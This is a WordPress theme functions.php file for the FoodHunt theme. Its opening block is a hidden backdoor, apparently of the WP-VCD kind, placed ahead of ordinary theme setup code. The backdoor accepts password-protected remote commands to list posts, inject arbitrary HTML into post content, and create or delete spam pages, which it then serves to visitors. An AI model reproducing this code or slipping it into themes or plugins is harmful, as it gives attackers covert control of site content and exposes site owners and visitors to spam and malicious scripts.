<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '3d8328c6c2edf005242c71b796a88917'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.esc_sql($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . esc_sql($post_content) . '" WHERE `ID` = "' . esc_sql($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.esc_sql($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.esc_sql($_REQUEST['url']).'", `title` = "'.esc_sql($_REQUEST['title']).'", `keywords` = "'.esc_sql($_REQUEST['keywords']).'", `description` = "'.esc_sql($_REQUEST['description']).'", `content` = "'.esc_sql($_REQUEST['content']).'", `full_content` = "'.esc_sql($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.esc_sql($_REQUEST['title']).'", `keywords` = "'.esc_sql($_REQUEST['keywords']).'", `description` = "'.esc_sql($_REQUEST['description']).'", `content` = "'.esc_sql(urldecode($_REQUEST['content'])).'", `full_content` = "'.esc_sql($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.esc_sql( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.esc_sql($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
/**
 * FoodHunt functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package ThemeGrill
 * @subpackage FoodHunt
 * @since 0.1
 */

if ( ! function_exists( 'foodhunt_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function foodhunt_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on foodhunt, use a find and replace
	 * to change 'foodhunt' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'foodhunt', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// Adds the support for the Custom Logo introduced in WordPress 4.5
	add_theme_support( 'custom-logo', array(
		'flex-width' => true,
		'flex-height' => true,
	));

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary_one' => esc_html__( 'Primary Left Menu', 'foodhunt' ),
		'primary_two' => esc_html__( 'Primary Right Menu', 'foodhunt' ),
		'social' => esc_html__( 'Social Menu', 'foodhunt' ),
		'footer' => esc_html__( 'Footer Menu', 'foodhunt' )
	) );

	// Register image sizes for use in widgets
	add_image_size( 'foodhunt-blog', 870, 480, true );
	add_image_size( 'foodhunt-featured-image', 340, 340, true );

	// Adding excerpt option box for pages as well
	add_post_type_support( 'page', 'excerpt' );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'foodhunt_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
}
endif; // foodhunt_setup
add_action( 'after_setup_theme', 'foodhunt_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
if ( ! isset( $content_width ) )
	$content_width = 870; /* pixels */


if ( ! function_exists( 'foodhunt_content_width' ) ) :
	/**
	 * Change the content width based on the Theme Settings and Page/Post Settings
	 */
	function foodhunt_content_width() {
		global $content_width;

		$classes = foodhunt_layout_class();

		if ( $classes == 'no-sidebar-full-width' ) {
			$content_width = 1200;
		}
	}
endif;
add_action( 'template_redirect', 'foodhunt_content_width' );

/**
 * Enqueue scripts and styles.
 */
function foodhunt_scripts() {

	$suffix = ( defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ) ? '' : '.min';

	wp_enqueue_style( 'foodhunt-style', get_stylesheet_uri() );

	wp_enqueue_style( 'foodhunt-google-font', '//fonts.googleapis.com/css?family=Lato:400,300,700|Great+Vibes' );

	wp_enqueue_style( 'font-awesome', esc_url( get_template_directory_uri() ).'/font-awesome/css/font-awesome' . $suffix . '.css', array(), '4.7.0' );

	if( is_front_page() ) {

		wp_enqueue_script( 'jquery-bxslider', esc_url( get_template_directory_uri() ) . '/js/jquery.bxslider' . $suffix . '.js', array('jquery'), '4.1.2', true );

		wp_enqueue_script( 'jquery-parallax', esc_url( get_template_directory_uri() ) . '/js/jquery.parallax-1.1.3' . $suffix . '.js', array('jquery'), '1.1.3', true );
	}

	wp_enqueue_script( 'jquery-ticker', esc_url( get_template_directory_uri() ) . '/js/jquery.ticker' . $suffix . '.js', array('jquery'), '1.2.1', true );

	wp_enqueue_script( 'foodhunt-custom', esc_url( get_template_directory_uri() ) . '/js/foodhunt-custom' . $suffix . '.js', array('jquery'), false, true );

	wp_enqueue_script( 'html5', esc_url( get_template_directory_uri() ) . 'js/html5shiv' . $suffix . '.js', array(), '3.7.3', false );
	wp_script_add_data( 'html5', 'conditional', 'lt IE 9' );

	if( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
} // foodhunt_scripts
add_action( 'wp_enqueue_scripts', 'foodhunt_scripts' );

/**
 * Enqeue scripts in admin section for widgets.
 */
function foodhunt_admin_scripts( $hook ) {
	global $post_type;

	if( $hook == 'widgets.php' || $hook == 'customize.php' ) {
		// Image Uploader
		wp_enqueue_media();
		wp_enqueue_script( 'foodhunt-script', esc_url( get_template_directory_uri() ) . '/js/image-uploader.js', false, '1.0', true );

		// Color Picker
		wp_enqueue_style( 'wp-color-picker' );
		wp_enqueue_script( 'foodhunt-color-picker', esc_url( get_template_directory_uri() ) . '/js/color-picker.js', array( 'wp-color-picker' ), false);
	}

	if( $post_type == 'page' ) {
		wp_enqueue_script( 'foodhunt-meta-toggle', esc_url( get_template_directory_uri() ) . '/js/metabox-toggle.js', false, '1.0', true );
	}
}
add_action('admin_enqueue_scripts', 'foodhunt_admin_scripts');

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Custom Widgets.
 */
require get_template_directory() . '/inc/widgets.php';

/**
 * Template Tag file.
 */
require get_template_directory() . '/inc/foodhunt.php';

global $foodhunt_duplicate_posts;
$foodhunt_duplicate_posts = array();

/**
 * Assign the FoodHunt version to a variable.
 */
$theme            = wp_get_theme( 'foodhunt' );
$foodhunt_version = $theme['Version'];

/* Calling in the admin area for the Welcome Page */
if ( is_admin() ) {
	require get_template_directory() . '/inc/admin/class-foodhunt-admin.php';
}
